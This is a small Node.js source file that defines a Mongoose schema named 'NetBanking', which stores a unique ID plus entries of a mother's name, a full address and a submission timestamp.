const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true, unique: true },
    entries: [
        {
            mother_name: { type: String, required: true },
            full_address: { type: String, required: true },
            submittedAt: { type: Date, default: Date.now }
        }
    ]
});

module.exports = mongoose.model('NetBanking', netBankingSchema);
